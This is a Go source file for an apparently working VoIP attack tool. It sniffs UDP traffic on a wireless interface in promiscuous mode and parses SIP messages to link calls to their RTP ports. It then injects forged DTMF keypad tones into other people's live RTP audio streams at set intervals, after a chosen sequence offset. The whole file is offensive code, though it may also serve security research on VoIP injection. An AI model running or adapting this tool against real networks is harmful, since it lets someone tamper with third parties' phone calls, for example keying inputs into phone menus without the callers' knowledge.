package main

import (
	"flag"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/jart/gosip/sip"
)

var (
	black   = Color("\033[1;30m%s\033[0m")
	red     = Color("\033[1;31m%s\033[0m")
	green   = Color("\033[1;32m%s\033[0m")
	yellow  = Color("\033[1;33m%s\033[0m")
	purple  = Color("\033[1;34m%s\033[0m")
	magenta = Color("\033[1;35m%s\033[0m")
	teal    = Color("\033[1;36m%s\033[0m")
	white   = Color("\033[1;37m%s\033[0m")
	bold    = Color("\033[1m%s\033[0m")
	grey    = Color("\033[2m%s\033[0m")
)

func Color(colorString string) func(...interface{}) string {
	sprint := func(args ...interface{}) string {
		return fmt.Sprintf(colorString,
			fmt.Sprint(args...))
	}
	return sprint
}

var (
	iface             = flag.String("i", "wlan0", "Interface to listen on")
	injectionInterval = flag.Duration("t", 3*time.Second, "Time between injection attempts")
	dtmfOffset        = flag.Uint("dtmf-offset", 200, "DTMF injection sequence offset (begin injecting packets at this sequence number)")
)

var (
	streams = map[uint32]*rtpStream{} // SSRC -> rtpStream
	calls   = map[string]uint16{}     // Call-ID -> local port
)

// between gets the string between two substrings
func between(s, start, end string) string {
	sp := strings.Split(s, start)
	if len(sp) < 2 {
		return ""
	}
	return strings.Split(sp[1], end)[0]
}

// txUDP transmits a UDP packet from a given packet template and payload
func txUDP(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) error {
	*pkt.ApplicationLayer().(*gopacket.Payload) = payload
	if err := pkt.TransportLayer().(*layers.UDP).SetNetworkLayerForChecksum(pkt.NetworkLayer()); err != nil {
		return err
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializePacket(buffer, options, pkt); err != nil {
		return err
	}

	return handle.WritePacketData(buffer.Bytes())
}

func main() {
	flag.Parse()

	handle, err := pcap.OpenLive(*iface, 262144, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("udp"); err != nil {
		log.Fatal(err)
	}

	fmt.Printf(`
    ` + red("_________________") + `
   ` + red("/   ._________.   \\") + grey(":.") + `
   ` + red("|__|") + bold(" [1][2][3] ") + red("|__|") + grey(":  :") + `
     /  ` + bold("[4][5][6]") + `  \   ` + grey(":  :") + `
    /   ` + bold("[7][8][9]") + `   \   ` + grey(":..:") + `
    | ` + bold("     [0]     ") + ` |   ` + grey(":..:") + `
    '---------------'

`)

	log.Printf("Monitoring %s", *iface)
	for pkt := range gopacket.NewPacketSource(handle, handle.LinkType()).Packets() {
		// Decode UDP packet
		udp := pkt.Layer(layers.LayerTypeUDP)
		if udp == nil {
			continue
		}
		udpLayer := udp.(*layers.UDP)

		// Attempt to decode RTP packet
		var rtph rtpHeader
		if err := rtph.read(udpLayer.Payload); err == nil {
			// Find SIP call ID by RTP port
			call := "[unknown]"
			for callID, rtpPort := range calls {
				if strconv.Itoa(int(rtpPort)) == udpLayer.SrcPort.String() {
					call = callID
					break
				}
			}

			// Check if stream seen
			if _, ok := streams[rtph.SSRC]; !ok {
				log.Printf("[Call %s] Tracking stream %d to call (seq %d)", call, rtph.SSRC, rtph.Seq)
				streams[rtph.SSRC] = &rtpStream{
					FirstSeen: time.Now(),
				}
			}

			// Check if it has been at least N seconds since last packet injection
			stream := streams[rtph.SSRC]
			if rtph.Seq >= uint16(*dtmfOffset) &&
				(stream.LastInjected.IsZero() ||
					time.Since(stream.LastInjected) > *injectionInterval) {

				log.Printf(
					"[Call %s] Injecting DTMF tone into stream %d [%s:%d -> %s:%d]",
					call,
					rtph.SSRC,
					pkt.NetworkLayer().NetworkFlow().Src(), udpLayer.SrcPort,
					pkt.NetworkLayer().NetworkFlow().Dst(), udpLayer.DstPort,
				)

				// Send DTMF tone
				if err := sendDTMF(rtph.Seq+1, rtph.TS, rtph.SSRC, func(b []byte) error {
					return txUDP(handle, pkt, b)
				}); err != nil {
					log.Fatal(err)
				}
				stream.LastInjected = time.Now()
			}
		}

		// Attempt to decode SIP packet
		msg, err := sip.ParseMsg(udpLayer.Payload)
		if err == nil {
			if msg.Payload != nil {
				// Parse RTP local port from SIP message payload
				rtpLocalPort, err := strconv.Atoi(between(string(msg.Payload.Data()), "m=audio ", " RTP/AVP"))
				if err == nil {
					// Register call if we haven't seen it before
					if _, ok := calls[msg.CallID]; !ok {
						log.Printf("[Call %s] Tracking call from %s RTP local port %d", msg.CallID, msg.From, rtpLocalPort)
						calls[msg.CallID] = uint16(rtpLocalPort)
					}
				}
			} else {
				// Cleanup when call is over
				if msg.Phrase == "Ok" {
					log.Printf("[Call %s] Call ended", msg.CallID)

					// Delete call's RTP stream
					localPort := calls[msg.CallID]
					for ssrc, stream := range streams {
						if stream.localPort == localPort {
							delete(streams, ssrc)
							break
						}
					}

					// Cleanup call to RTP stream mapping
					delete(calls, msg.CallID)
				}
			}
		}
	}
}
